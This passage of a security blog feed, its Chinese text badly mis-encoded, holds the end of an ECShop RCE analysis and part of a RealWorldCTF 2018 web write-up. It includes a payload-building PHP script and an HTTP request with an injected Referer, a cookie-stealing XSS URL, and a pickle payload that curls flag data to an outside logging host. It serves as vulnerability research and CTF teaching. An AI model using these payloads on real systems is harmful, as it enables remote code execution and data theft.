<li>fetch_strï¼ˆ/includes/cls_template.php:281ï¼‰ï¼šè¿‡æ»¤äº†ä¸€å †å‚æ•°ç„¶åå°†<code>{}</code>å†…çš„å­—ç¬¦ä¸²ä¼ å…¥<code>select</code>ä¸­å¤„ç†ï¼Œè¿”å›å¤„ç†åçš„å­—ç¬¦ä¸²</li>
<li>selectï¼ˆ/includes/cls_template.php:371ï¼‰ï¼šå¦‚æœä¼ å…¥çš„å‚æ•°ä»¥<code>$</code>å¼€å¤´ï¼Œåˆ™å°†å…¶ä¼ å…¥<code>get_val</code>å¹¶å°†ç»“æœæ‹¼æ¥åˆ°<code>&lt;?php echo &#39; . $res . &#39;; ?&gt;</code>è¿”å›</li>
<li>get_valï¼ˆ/includes/cls_template.php:553ï¼‰ï¼šé¿å¼€å…¶ä»–å‡ ä¸ªåˆ¤æ–­ï¼Œç›´æ¥å°†å‚æ•°ä¼ å…¥<code>make_val</code>æ‰§è¡Œå¹¶è¿”å›</li>
<li>make_varï¼ˆ/includes/cls_template.php:663ï¼‰ï¼šå°†å­—ç¬¦ä¸²æ‹¼æ¥è¿›<code>$p = &#39;$this-&gt;_var[\&#39;&#39; . $val . &#39;\&#39;]&#39;;</code>å¹¶è¿”å›</li>
</ul>
<p>æ ¹æ®ä»¥ä¸Šåˆ©ç”¨é“¾ï¼Œæœ€åæ„é€ çš„payloadä¸º<code>{$&#39;];assert(xxxxxx);//}</code><br>æœ€åæ‹¼æ¥è¿›evalçš„å‚æ•°é•¿è¿™æ ·ï¼ˆå…¶å®ä¸Šé¢åˆ©ç”¨é“¾ä¸­è¿˜æœ‰å…¶ä»–è®¸å¤šåˆ†æ”¯å¯ä»¥æœ€åæ‹¼æ¥å‡ºå¯æ‰§è¡Œçš„ä»£ç ï¼Œæˆ‘å°±ä¸æ·±å…¥ç ”ç©¶äº†<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;_var[<span class="string">''</span>];assert(base64_decode(<span class="string">"ZmlsZV9wdXRfY29udGVudHMoJy4vdGVtcC94aXNoaXIucGhwJywnPD9waHAgcGhwaW5mbygpOz8+Jyk="</span>));<span class="comment">//']; <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x03æ¼æ´åˆ©ç”¨"><a href="#0x03æ¼æ´åˆ©ç”¨" class="headerlink" title="0x03æ¼æ´åˆ©ç”¨"></a>0x03æ¼æ´åˆ©ç”¨</h2><p>æœ€åå°±æ˜¯æ„é€ å®Œæ•´çš„payloadäº†ï¼Œæˆ‘çš„æ„é€ è„šæœ¬å¦‚ä¸‹ï¼Œæ‰”åˆ°phpé‡Œè¿è¡Œå°±å¥½<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$payload = <span class="string">"file_put_contents('./temp/xishir.php','&lt;?php phpinfo();?&gt;')"</span>;</span><br><span class="line">$res = <span class="string">"\&#123;\$'];assert(base64_decode(\""</span>.base64_encode($payload).<span class="string">"\"));//&#125;"</span>;</span><br><span class="line"></span><br><span class="line">bin2hex($res);</span><br><span class="line">$a = [<span class="string">'num'</span> =&gt; <span class="string">"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x"</span>.bin2hex($res).<span class="string">",9"</span>, <span class="string">'id'</span> =&gt; <span class="string">"'/*"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ECShop_V2.7.3_UTF8_release1106/upload/user.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:273:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x5c7b24275d3b617373657274286261736536345f6465636f646528225a6d6c735a56397764585266593239756447567564484d6f4a793476644756746343393461584e6f61584975634768774a79776e5044397761484167634768776157356d627967704f7a382b4a796b3d2229293b2f2f7d,9";s:2:"id";s:3:"'/*";&#125;</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure><br>payloadè¿è¡Œæ•ˆæœ<br><img src="/img/2018-ecshop-rce-5.gif" alt="">  </p>
<h2 id="0x04å‚è€ƒé“¾æ¥"><a href="#0x04å‚è€ƒé“¾æ¥" class="headerlink" title="0x04å‚è€ƒé“¾æ¥"></a>0x04å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://xz.aliyun.com/t/2689" target="_blank" rel="noopener">ECShopå…¨ç³»åˆ—ç‰ˆæœ¬è¿œç¨‹ä»£ç æ‰§è¡Œé«˜å±æ¼æ´åˆ†æ</a></li>
<li><a href="www.lmxspace.com/2018/09/02/ECShop-sqli-and-rce/">ECShop sqli and rce</a></li>
</ul>
<h2 id="0x05åè¯"><a href="#0x05åè¯" class="headerlink" title="0x05åè¯"></a>0x05åè¯</h2><p>ECShop3.*ä¸­åªæ˜¯åŠ äº†ä¸€äº›é˜²æŠ¤ï¼Œæ ¸å¿ƒæ¼æ´ç‚¹æ¢æ±¤ä¸æ¢è¯ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è‡ªè¡Œç ”ç©¶8<br>ECShop4.0çš„ä¿®å¤æ–¹æ¡ˆæ˜¯æŠŠæ’å…¥sqlçš„numå’Œidå¼ºè½¬ä¸ºintï¼Œä½†æ˜¯å‰é¢è¿˜æœ‰ä¸ªåŠ¨æ€å‡½æ•°è°ƒç”¨å’Œååºåˆ—åŒ–è¿˜æ˜¯æœ‰é£é™©çš„æ„Ÿè§‰ï¼Œç­‰ä¸€ä¸ªå¸ˆå‚…æ¥è§£ç­”ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯æ˜¨å¤©åˆ†æä¸‹è½½ä»£ç çš„æ—¶å€™æ³¨å†Œäº†ä¸€ä¸‹ECShopå®˜æ–¹çš„è´¦å·ï¼Œä»Šå¤©å°±æœ‰å°æ”¹æ”¹æ‰“ç”µè¯é—®æˆ‘æ˜¯ä¸æ˜¯æç”µå•†çš„ï¼Œå’Œå¥¹è¯´æˆ‘åªæ˜¯ä¸‹è½½ä»£ç æ¥å­¦ä¹ ç ”ç©¶çš„ï¼Œå¥¹è¿˜æ¨èæˆ‘å»åˆ†ææœ€æ–°çš„4.*ç‰ˆæœ¬ï¼Œå¥½çš„æˆ‘ä¸€å®šåˆ†æï¼Œå’•å’•å’•</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00å‰è¨€&quot;&gt;&lt;/a&gt;0x00å‰è¨€&lt;/h2&gt;&lt;p&gt;å‰å‡ å¤©å‡ºäº†ä¸ª&lt;code&gt;ECShop&amp;lt;= 2.7.x/3.6.x&lt;/code&gt;å‰å°RCEï¼Œå®è®­å¤ªæ— èŠäº†æ¥åˆ†æä¸€æ³¢&lt;br&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="https://www.codemonster.cn/tags/RCE/"/>
    
      <category term="SQL" scheme="https://www.codemonster.cn/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>2018 RWCTF web WriteUp</title>
    <link href="https://www.codemonster.cn/2018/07/31/2018-rwctf-web-writeup/"/>
    <id>https://www.codemonster.cn/2018/07/31/2018-rwctf-web-writeup/</id>
    <published>2018-07-31T05:11:58.000Z</published>
    <updated>2018-07-31T05:19:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‘¨æœ«æ‰“äº†é•¿äº­ä¸¾åŠçš„RealWorldCTFï¼Œtqlï¼Œå†™ä¸€ä¸‹webçš„wpç»™åšå®¢é™¤é™¤è‰ã€‚  </p>
<a id="more"></a>
<h1 id="dot-free"><a href="#dot-free" class="headerlink" title="dot free"></a>dot free</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">All the IP addresses and domain names have dots, but can you hack without dot?</span><br></pre></td></tr></table></figure>
<p>ä¸»é¡µæœ‰ä¸ªæäº¤urlçš„æ¡†ï¼Œå°è¯•æäº¤è‡ªå·±çš„urlï¼Œä½†æ˜¯æ‰“ä¸åˆ°ï¼Œæ€€ç–‘é™åˆ¶äº†ipï¼Œæµ‹è¯•ä¸­å‘ç°ç½‘ç«™æ˜¯æ˜¯djangoï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼ï¼Œæäº¤é”™è¯¯çš„postå‚æ•°å°±å¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯<br><img src="/img/2018-rwctf-img8.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°webç«™ç‚¹çš„åå­—å« XSSWebSiteï¼Œäºæ˜¯æ‰¾xssçš„ç‚¹ï¼Œå°è¯•æŸ¥æ‰¾djangoçš„xssï¼Œä½†æ˜¯æœ€æ–°ç‰ˆæœ¬å¹¶æ²¡æœ‰å·²çŸ¥çš„xssæ¼æ´ï¼Œåé¢å‘ç°ä¸»é¡µå­˜åœ¨è¿™æ ·ä¸€æ®µjsä»£ç ï¼Œçœ‹èµ·æ¥æ˜¯ä¸ªdomxss<br><img src="/img/2018-rwctf-img9.png" alt=""></p>
<p>è°ƒè¯•ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“è¿™æ®µä»£ç ä»æµè§ˆå™¨çš„urlå–äº†æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œurldecodeåæ ¼å¼åŒ–ä¸ºjsonï¼Œç„¶åå‘é€åˆ°ä¸€ä¸ªç›‘å¬å™¨é‡Œå»æ“ä½œï¼Œä»£ç é‡Œè¿‡æ»¤äº†valueå‚æ•°ä¸èƒ½å‡ºç°<code>.</code>ï¼Œ<code>//</code>å’Œ<code>ã€‚</code>ï¼Œtypeä¸ä¸ºiframeçš„æ—¶å€™ä¼šå°†valueæ’å…¥åˆ°ä¸€ä¸ªscriptæ ‡ç­¾ä¸­<br>çœ‹åˆ°è¿™é‡Œå’Œé¢˜ç›®æç¤ºå¯¹åº”ä¸Šäº†ï¼Œä¸èƒ½å‡ºç°<code>.</code>ï¼Œæœ€åæ„é€ payloadå¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;13.57.104.34&#x2F;?&#123;%22iframe%22:&#123;%22value%22:%22http:&#x2F;\\111111111%22,%22type%22:%22xxxx%22&#125;&#125;</span><br></pre></td></tr></table></figure><br>11111111æ›¿æ¢ä¸ºè‡ªå·±çš„vpsçš„ipè½¬10è¿›åˆ¶ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢é‡Œå·²ç»å‡ºç°ä¸€ä¸ªsrc=11111111çš„scriptæ ‡ç­¾äº†<br><img src="/img/2018-rwctf-img11.png" alt=""></p>
<p>ç„¶åæäº¤è¿™ä¸ªurlåˆ°Recieveï¼ŒæœåŠ¡ç«¯å°±ä¼šæ‰§è¡Œvpsä¸Šæå‰æ„é€ å¥½çš„jsè¯­å¥äº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://xxxxxxx/?="</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br></pre></td></tr></table></figure><br>æœ€åflagåœ¨cookieé‡Œ<br><img src="/img/2018-rwctf-img10.png" alt=""><br>flag:  rwctf{L00kI5TheFlo9}</p>
<h1 id="bookhub"><a href="#bookhub" class="headerlink" title="bookhub"></a>bookhub</h1><p>é¢˜ç›®æç¤ºwww.zipï¼Œå¯ä»¥ä¸‹è½½åˆ°æºç <br>çœ‹åˆ°ä»£ç é‡Œç™»é™†çš„æ—¶å€™ä¼šæ£€æŸ¥ipç™½åå•ï¼Œè¿™é‡Œçš„ipæ˜¯å–çš„xffï¼Œä¸åœ¨ç™½åå•å†…ä¼šæç¤ºipä¸åœ¨ç™½åå•å†…<br><img src="/img/2018-rwctf-img12.png" alt=""><br>ä¿®æ”¹xffä¸ºç™½åå•ipå¤±è´¥ï¼ŒçŒœæµ‹xffè·å–åˆ°çš„æ˜¯nginxè½¬å‘è¿‡å»çš„ipï¼Œæ‰€ä»¥æƒ³åˆ°ä»ä¸Šé¢è¿™ä¸²é‡Œçš„å”¯ä¸€ä¸€ä¸ªå¤–ç½‘ip 18.213.16.123å…¥æ‰‹<br>æ‰«æè¯¥ipï¼Œå‘ç°5000ç«¯å£ä¹Ÿå¼€äº†ä¸€ä¸ªç›¸åŒçš„åº”ç”¨ç¨‹åºbookhubï¼Œå¹¶ä¸”å¼€å¯äº†debugæ¨¡å¼ï¼Œåœ¨è¿™é‡Œç™»é™†çš„æç¤ºæ˜¯å¯†ç é”™è¯¯ï¼Œè¯´æ˜å·²ç»ç»•è¿‡äº†ç™½åå•æ£€æŸ¥ã€‚</p>
<p>å®¡è®¡ä»£ç å‘ç°æœ‰ä¸€å¤„é‰´æƒçš„è£…é¥°å™¨ä½¿ç”¨é”™è¯¯(routeå’Œlogin_requiredé¡ºåºåäº†)<br><img src="/img/2018-rwctf-img4.png" alt=""><br>è¿™ä¼šå¯¼è‡´é‰´æƒè£…é¥°å™¨æ— æ•ˆï¼Œæ²¡æœ‰ç™»é™†çš„ç”¨æˆ·ä¹Ÿèƒ½è°ƒç”¨è¯¥æ¥å£ï¼ˆdebugæ¨¡å¼ä¸‹<br>æŸ¥çœ‹æ¥å£ä»£ç ï¼Œå¯ä»¥çŸ¥é“è¿™ä¸ªæ¥å£evaläº†luaè„šæœ¬ï¼Œç”¨æ¥æ¸…é™¤é™¤äº†è‡ªå·±ä¹‹å¤–å…¶ä»–æ‰€æœ‰äººçš„sessionï¼Œå…¶ä¸­sessionidå­˜åœ¨æ‹¼æ¥æ“ä½œï¼Œå¹¶ä¸”å¯æ§ï¼Œæƒ³åˆ°å¯ä»¥æ³¨å…¥ç‚¹ä¸œè¥¿<br><img src="/img/2018-rwctf-img5.png" alt=""><br>å‚è€ƒ <a href="https://www.ctolib.com/topics-129777.html" target="_blank" rel="noopener">https://www.ctolib.com/topics-129777.html</a><br>é€šè¿‡è¿™ä¸ªæ¥å£ï¼Œå°†æ¶æ„çš„æ•°æ®ï¼ˆcPickleååºåˆ—åŒ–æ¼æ´çš„payloadï¼‰æ³¨å…¥åˆ°redisä¸­ï¼Œå½“é‰´æƒçš„æ—¶å€™å°±ä¼šååºåˆ—åŒ–è¯¥å­—ç¬¦ä¸²ï¼Œå°±èƒ½ä»»æ„å‘½ä»¤æ‰§è¡Œäº†ï¼Œä½†æ˜¯å› ä¸ºè¯¥æ¥å£éœ€è¦csrf_tokenæ ¡éªŒï¼Œæ‰€ä»¥å¤šä¸€æ­¥è·å–tokençš„æ“ä½œ<br>å…·ä½“æ“ä½œå¦‚ä¸‹ï¼š<br>1.ç”Ÿæˆpayloadï¼š<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""curl http://xxxx.ceye.io/`/readflag|base64`"""</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)</span><br><span class="line"></span><br><span class="line">evil = cPickle.dumps(genpoc())</span><br><span class="line"><span class="keyword">print</span> evil.replace(<span class="string">"\n"</span>,<span class="string">"\\n"</span>)</span><br></pre></td></tr></table></figure><br>2.æ„é€ æ¶æ„çš„sessionidå¹¶è®¿é—®/login/è·å–csrf_tokenï¼š<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bookhub-session=aaa<span class="string">"&#125; redis.call("</span>set<span class="string">","</span>bookhub:session:aaa<span class="string">","</span>cposix\nsystem\np1\n(S<span class="string">'curl http://xxxxxxx.ceye.io/`/readflag|base64`'</span>\np2\ntRp3\n.<span class="string">")--;</span></span><br></pre></td></tr></table></figure><br>è¿™é‡Œæ‹¼æ¥è¿›luaè„šæœ¬åé•¿è¿™æ ·ï¼š<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> inputs = &#123;<span class="string">"bookhub:session:aaa"</span>&#125;</span><br><span class="line">redis.call(<span class="string">"set"</span>,<span class="string">"bookhub:session:aaa"</span>,<span class="string">"cposix\nsystem\np1\n(S'curl http://xxxxxxx.ceye.io/`/readflag|base64`'\np2\ntRp3\n."</span>)<span class="comment">--;</span></span><br></pre></td></tr></table></figure><br>åˆ°æ—¶å€™è„šæœ¬è¿è¡Œåå°±ä¼šå°†æ¶æ„æ•°æ®å†™å…¥<code>aaa</code>è¿™ä¸ªsession-idçš„valueé‡Œï¼Œå¹¶ä¸”åˆ é™¤å…¶ä»–é™¤äº†aaaæ„å¤–çš„session<br><img src="/img/2018-rwctf-img6.png" alt=""><br>3.å¸¦ç€2ä¸­ç”Ÿæˆçš„ssrf_tokenå’Œæ¶æ„çš„session-idå»è¯·æ±‚ /admin/system/refresh_session<br>postdataï¼š submit=1&amp;ssrf_token=<br>å¯¼è‡´luaä»£ç æ³¨å…¥ä¿®æ”¹æˆ‘ä»¬çš„ç›®æ ‡session-idçš„valueå€¼, æœ€åç”¨<code>aaa</code>è¿™ä¸ªsession-idä»»æ„è®¿é—®ä¸€ä¸ªéœ€è¦sessionçš„é¡µé¢å³å¯è§¦å‘ååºåˆ—åŒ–æ¼æ´æ‰§è¡Œå‘½ä»¤<br>æœ€åç”¨ceyeå¤–å¸¦å‡ºflag<br><img src="/img/2018-rwctf-img13.png" alt=""></p>
<h1 id="Print-MD"><a href="#Print-MD" class="headerlink" title="Print-MD"></a>Print-MD</h1><p>Print-MDè¿™é“é¢˜æ¯”èµ›è¿‡ç¨‹ä¸­æ²¡åšå‡ºæ¥ï¼Œæ¯”èµ›ç»“æŸå¿™ç€ä¸Šç­ï¼Œwpè¿˜æ²¡å†™å®Œï¼Œå…ˆå†™ä¸€ä¸‹æ€è·¯<br>æƒ³çœ‹wpçš„å¯ä»¥å»è“çŒ«å¸ˆå‚…çš„åšå®¢è†œä¸€ä¸‹ <a href="https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup" target="_blank" rel="noopener">RealWorldCTF PrintMD writeup</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PrintMD</span><br><span class="line">Paste your HackMD link to get a printer-friendly version!</span><br><span class="line">The note should neither be Protected nor Private.</span><br><span class="line">Press Ctrl + P to print or save as PDF.</span><br><span class="line">PrintMD is compatible with outdated browsers.</span><br><span class="line">If the link is published version of the note, which contains &#x2F;s&#x2F;, you can append &#x2F;edit to get the original link. e.g., https:&#x2F;&#x2F;hackmd.io&#x2F;s&#x2F;HyCFXNkNm&#x2F;edit</span><br><span class="line">â€flag is in &#x2F;flag</span><br></pre></td></tr></table></figure><br><code>print?url=</code>å¯ä»¥æäº¤ä¸€ä¸ªhackmdçš„é“¾æ¥å¹¶å°†mdæ–‡æ¡£è§£æä¸ºhtmlï¼Œä½†æ˜¯é™åˆ¶äº†åªèƒ½è¯»å–<code>https://hackmd.io/</code>å¼€å¤´çš„urlï¼Œæ•…æ— æ³•ssrf  </p>
<p>ç¬¬ä¸€ä¸ªhintæç¤º å…¼å®¹ä½ç‰ˆæœ¬æµè§ˆå™¨ï¼Œå…¶å®ä¹‹å‰å°±æœ‰å‘ç°åœ¨æˆ‘æœ¬æœº<code>ä¸åŒæµè§ˆå™¨</code>è®¿é—®printæ¥å£ä¼šæœ‰ä¸åŒçš„æ•ˆæœï¼š</p>
<ol>
<li>chromeè¯·æ±‚è¯¥æ¥å£ï¼Œè¿”å›çš„æ ‡é¢˜æ˜¯ <code>è¯·ç¨å</code>ï¼Œç„¶åæµè§ˆå™¨å†å¾€å¤–å‘è¯·æ±‚è·å–hackmdçš„mdå†…å®¹ï¼Œç„¶åè§£ææˆhtmlå±•ç¤ºåˆ°é¡µé¢ä¸Š  </li>
<li>firefoxè¯·æ±‚æ¥å£ï¼Œè¿”å›çš„æ˜¯å·²ç»è§£æå¥½çš„htmlæ ‡ç­¾ï¼Œå¾ˆæ˜æ˜¾åç«¯åšäº†è¯·æ±‚å¹¶è§£æmdä¸ºhtmlçš„å·¥ä½œ</li>
</ol>
<p>çŒœæµ‹printæ¥å£åº”è¯¥æ˜¯æ ¡éªŒäº†user-agentï¼Œäºæ˜¯æµ‹è¯•äº†ä¸€ä¸‹chromeçš„uaï¼Œå‘ç°66.0æ˜¯ä¸ªåˆ†æ°´å²­ï¼Œç„¶è€Œå¹¶æ²¡æœ‰å•¥è¿›å±•<br><img src="/img/2018-rwctf-img1.png" alt=""><br><img src="/img/2018-rwctf-img2.png" alt=""></p>
<p>åé¢æŸ¥çœ‹å‰ç«¯ä»£ç é‡Œçš„ print.ba84889093b992d33112.js<br>å‘ç°è¿™æ ·ä¸€æ®µä»£ç <br><img src="/img/2018-rwctf-img3.png" alt=""><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªåº”è¯¥å°±æ˜¯printæ¥å£çš„æ ¸å¿ƒä»£ç äº†ï¼Œæ¥å—åˆ°urlå‚æ•°ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºhackmdçš„urlï¼Œç„¶ååœ¨urlæœ€åå¦‚æœä¸æ˜¯/downloadå°±æ‹¼æ¥ä¸€ä¸ª/downloadè¿›å»ï¼Œ<br>å› ä¸ºhackmd.io/xxxxxxx/download æ˜¯å¯ä»¥ä¸‹è½½markdownæ ¼å¼çš„æ–‡ä»¶çš„ï¼Œ<br>ç„¶åå°†uaå’Œurlä¼ å…¥ <code>/api/render/</code> æ¥å£ï¼Œå› ä¸ºè¿™ä¸ªæ¥å£å¤–éƒ¨æ²¡æœ‰æƒé™è®¿é—®ï¼ˆè®¿é—®ä¼š403ï¼‰ï¼Œè€Œä¸”ä¸çŸ¥é“è¿™ä¸ªæ¥å£è°ƒç”¨äº†å•¥åº“ï¼Œæ‰€ä»¥é™·å…¥äº†åƒµå±€</p>
<p>hint2 ç»™äº†render.jsçš„ä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;Router&#125; = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> &#123;matchesUA&#125; = <span class="built_in">require</span>(<span class="string">'browserslist-useragent'</span>)</span><br><span class="line"><span class="keyword">const</span> router = Router()</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>)</span><br><span class="line"><span class="keyword">const</span> md = <span class="built_in">require</span>(<span class="string">'../../plugins/md_srv'</span>)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">'/render'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> ret = &#123;&#125;</span><br><span class="line">  ret.ssr = !matchesUA(req.body.ua, &#123;</span><br><span class="line">    browsers: [<span class="string">"last 1 version"</span>, <span class="string">"&gt; 1%"</span>, <span class="string">"IE 10"</span>],</span><br><span class="line">    _allowHigherVersions: <span class="literal">true</span></span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (ret.ssr) &#123;</span><br><span class="line">    axios(req.body.url).then(<span class="function"><span class="params">r</span> =&gt;</span> &#123;</span><br><span class="line">          ret.mdbody = md.render(r.data)</span><br><span class="line">      res.json(ret)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    ret.mdbody = md.render(<span class="string">'# è¯·ç¨å€™â€¦'</span>)</span><br><span class="line">    res.json(ret)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router</span><br></pre></td></tr></table></figure><br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯æ§çš„åœ°æ–¹æœ‰ä¸‰ä¸ªç‚¹ï¼Œåˆ†åˆ«å¯¹åº”ä¸‰ä¸ªåº“ï¼š</p>
<ol>
<li>ua: å¯¹åº”<code>browserslist-useragent</code>åº“ï¼Œä¸»è¦æ˜¯ç”¨æ¥åˆ¤æ–­å½“å‰uaç‰ˆæœ¬æ˜¯å¦ç¬¦åˆé¢„æœŸç‰ˆæœ¬ï¼Œæ„Ÿè§‰é—®é¢˜ä¸å¤§</li>
<li>url: å¯¹åº”<code>axios</code>åº“ï¼Œå½“uaç‰ˆæœ¬è¢«åˆ¤å®šä¸ºä½ç‰ˆæœ¬æ—¶ï¼Œä¼šç”¨axioså¯¹urlå‘é€ä¸€ä¸ªgetè¯·æ±‚ï¼Œä½†æ˜¯urlé™åˆ¶æ­»äº†åªèƒ½ <code>https://hackmd.io/</code>ï¼Œæ‰€ä»¥èƒ½åˆ©ç”¨çš„åœ°æ–¹æœ‰é™</li>
<li>r.data: urlè¿”å›çš„å†…å®¹ï¼Œç„¶åç”¨<code>../../plugins/md_srv</code>è¿™ä¸ªåº“è¿›è¡Œäº†è§£æï¼Œä¸çŸ¥é“è¿™ä¸ªåº“æ˜¯å•¥æƒ…å†µ</li>
</ol>
<p>æ¯”èµ›è¿‡ç¨‹ä¸­åˆ°è¿™é‡Œåˆé™·å…¥äº†åƒµå±€ï¼Œèµ›åé—®äº†è“çŒ«å¸ˆå‚…æ‰çŸ¥é“åˆ©ç”¨ç‚¹åœ¨axiosè¿™è¾¹</p>
<p>æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å‘¨æœ«æ‰“äº†é•¿äº­ä¸¾åŠçš„RealWorldCTFï¼Œtqlï¼Œå†™ä¸€ä¸‹webçš„wpç»™åšå®¢é™¤é™¤è‰ã€‚  &lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.codemonster.cn/tags/CTF/"/>
    
      <category term="WriteUp" scheme="https://www.codemonster.cn/tags/WriteUp/"/>
    
      <category term="WEB" scheme="https://www.codemonster.cn/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>2018 ä¿¡æ¯å®‰å…¨é“äººä¸‰é¡¹èµ›ç¬¬ä¸ƒ(ç¦å»º)èµ›åŒº WriteUp</title>
    <link href="https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/"/>
    <id>https://www.codemonster.cn/2018/05/17/2018-t3sec-fujian-writeup/</id>
    <published>2018-05-17T06:42:59.000Z</published>
    <updated>2018-07-28T06:19:57.000Z</updated>
    
